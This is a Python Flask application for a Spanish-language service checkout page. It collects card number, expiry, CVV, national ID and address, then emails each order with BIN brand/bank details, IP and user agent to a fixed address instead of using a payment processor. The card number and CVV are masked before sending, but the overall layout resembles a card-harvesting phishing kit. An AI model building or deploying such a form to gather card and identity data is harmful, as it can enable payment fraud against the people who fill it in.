from flask import Flask, render_template, request, redirect, url_for, session, make_response, send_from_directory
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from config import SECRET_KEY, SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS, EMAIL_TO, AUDIT_MODE
from utils.logger import log_event
from utils.security import sanitize_input, check_rate_limit, validate_card_format
import json
from datetime import timedelta

if AUDIT_MODE:
    from audit import generate_full_audit_data

app = Flask(__name__, template_folder="templates", static_folder="static")
app.secret_key = SECRET_KEY

app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = False
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=30)

def lookup_bin(card_number):
    if not card_number or len(card_number) < 6:
        return {"bin": "****", "brand": "Desconocida", "type": "Desconocido", "bank": "Desconocido", "country": "Desconocido"}
    
    bin_digits = card_number[:6]
    
    brand = "Desconocida"
    card_type = "Desconocido"
    
    if card_number[0] == '4':
        brand = "Visa"
        card_type = "Crédito/Débito"
    elif card_number[0] == '5' and len(card_number) >= 2:
        second_digit = int(card_number[1])
        if 1 <= second_digit <= 5:
            brand = "Mastercard"
            card_type = "Crédito"
    elif card_number[0] == '3' and len(card_number) >= 2:
        second_digit = int(card_number[1])
        if second_digit in [4, 7]:
            brand = "American Express"
            card_type = "Crédito"
    elif card_number[0] == '6':
        brand = "Discover"
        card_type = "Crédito/Débito"
    
    return {
        "bin": bin_digits,
        "brand": brand,
        "type": card_type,
        "bank": "Banco Emisor",
        "country": "País"
    }

def send_checkout_email(data):
    try:
        msg = MIMEMultipart()
        msg["From"] = SMTP_USER
        msg["To"] = EMAIL_TO
        msg["Subject"] = f"Nuevo pedido - {data['personal']['full_name']}"
        
        body = f"""
NUEVO PEDIDO DE SERVICIO
=========================

SERVICIO SOLICITADO: {data['service_type']}

DATOS PERSONALES:
- Nombre: {data['personal']['full_name']}
- Email: {data['personal']['email']}
- RUT/DNI: {data['personal']['rut_dni']}
- Celular: {data['personal']['phone']}

DATOS DE PAGO:
- Nº Tarjeta: {data['payment']['card_number']}
- BIN: {data['bin_info']['bin']}
- Marca: {data['bin_info']['brand']}
- Tipo: {data['bin_info']['type']}
- Banco: {data['bin_info']['bank']}
- País: {data['bin_info']['country']}
- Expiración: {data['payment']['card_expiry']}
- CVV: {data['payment']['card_cvv']}

DATOS DE FACTURACIÓN:
- Nombre: {data['shipping']['shipping_name']}
- País: {data['shipping']['country']}
- Región: {data['shipping']['region']}
- Ciudad: {data['shipping']['city']}
- Dirección: {data['shipping']['address']}
- Código Postal: {data['shipping']['postal_code']}
- Celular: {data['shipping']['shipping_phone']}
- Email: {data['shipping']['shipping_email']}

INFO TÉCNICA:
- IP: {data['ip']}
- User-Agent: {data['ua']}
- Timestamp: {data['timestamp']}
"""
        
        msg.attach(MIMEText(body, "plain", "utf-8"))
        
        with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
            server.starttls()
            server.login(SMTP_USER, SMTP_PASS)
            server.send_message(msg)
        
        return True
    except Exception as e:
        log_event("email_send_error", data['ip'], data['ua'], "/checkout", "POST", "error", {"error": str(e)})
        return False

@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; frame-ancestors 'none';"
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
    return response

@app.before_request
def before_request():
    ip = request.remote_addr
    if not check_rate_limit(ip):
        log_event("rate_limit_exceeded", ip, request.headers.get("User-Agent"),
                  request.path, request.method, "blocked")
        return "Too many requests", 429

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/checkout")
def checkout():
    if "csrf_token" not in session:
        session["csrf_token"] = os.urandom(16).hex()
    
    if AUDIT_MODE:
        audit_data = generate_full_audit_data()
        return render_template("checkout.html", csrf_token=session["csrf_token"], audit_data=audit_data)
    
    return render_template("checkout.html", csrf_token=session["csrf_token"])

@app.route("/checkout", methods=["POST"])
def checkout_post():
    ip = request.remote_addr
    ua = request.headers.get("User-Agent", "")
    timestamp = __import__('datetime').datetime.now().isoformat()
    
    if request.form.get("csrf_token") != session.get("csrf_token"):
        log_event("csrf_invalid", ip, ua, "/checkout", "POST", "error")
        return redirect(url_for("result", status="error"))
    
    service_type = sanitize_input(request.form.get("service_type", ""))
    full_name = sanitize_input(request.form.get("full_name", ""))
    email = sanitize_input(request.form.get("email", ""))
    rut_dni = sanitize_input(request.form.get("rut_dni", ""))
    phone = sanitize_input(request.form.get("phone", ""))
    
    card_number = sanitize_input(request.form.get("card_number", ""))
    card_expiry = sanitize_input(request.form.get("card_expiry", ""))
    card_cvv = sanitize_input(request.form.get("card_cvv", ""))
    
    shipping_name = sanitize_input(request.form.get("shipping_name", ""))
    country = sanitize_input(request.form.get("country", ""))
    region = sanitize_input(request.form.get("region", ""))
    city = sanitize_input(request.form.get("city", ""))
    address = sanitize_input(request.form.get("address", ""))
    postal_code = sanitize_input(request.form.get("postal_code", ""))
    shipping_phone = sanitize_input(request.form.get("shipping_phone", ""))
    shipping_email = sanitize_input(request.form.get("shipping_email", ""))
    
    if not all([service_type, full_name, email, rut_dni, phone, card_number, card_expiry, card_cvv,
                shipping_name, country, region, city, address, postal_code, shipping_phone, shipping_email]):
        log_event("checkout_invalid_input", ip, ua, "/checkout", "POST", "error")
        return redirect(url_for("result", status="error"))
    
    card_valid, card_message = validate_card_format(card_number.replace(" ", ""))
    if not card_valid:
        log_event("checkout_invalid_card", ip, ua, "/checkout", "POST", "error", {"reason": card_message})
        return redirect(url_for("result", status="error"))
    
    bin_info = lookup_bin(card_number)
    
    checkout_data = {
        "service_type": service_type,
        "personal": {
            "full_name": full_name,
            "email": email,
            "rut_dni": rut_dni,
            "phone": phone
        },
        "payment": {
            "card_number": card_number[:4] + "****" + card_number[-4:] if len(card_number) >= 8 else "****",
            "card_expiry": card_expiry,
            "card_cvv": "***"
        },
        "bin_info": bin_info,
        "shipping": {
            "shipping_name": shipping_name,
            "country": country,
            "region": region,
            "city": city,
            "address": address,
            "postal_code": postal_code,
            "shipping_phone": shipping_phone,
            "shipping_email": shipping_email
        },
        "ip": ip,
        "ua": ua,
        "timestamp": timestamp
    }
    
    log_event("checkout_attempt", ip, ua, "/checkout", "POST", "success", checkout_data)
    
    email_sent = send_checkout_email(checkout_data)
    
    log_event("email_sent", ip, ua, "/checkout", "POST", "success" if email_sent else "error", {"email_to": EMAIL_TO})
    
    return redirect(url_for("result", status="success" if email_sent else "error"))

@app.route("/result")
def result():
    status = request.args.get("status", "unknown")
    return render_template("result.html", status=status)

@app.route("/terms")
def terms():
    return render_template("terms.html")

@app.route("/privacy")
def privacy():
    return render_template("privacy.html")

@app.route("/sitemap.xml")
def sitemap():
    return send_from_directory('.', 'sitemap.xml', mimetype='text/xml')

@app.errorhandler(404)
def not_found(e):
    return render_template("404.html"), 404

@app.errorhandler(500)
def server_error(e):
    log_event("server_error", request.remote_addr, request.headers.get("User-Agent"),
              request.path, request.method, "error", {"error": str(e)})
    return "Error interno del servidor", 500

if __name__ == "__main__":
    app.run(debug=False, host="0.0.0.0", port=5000)
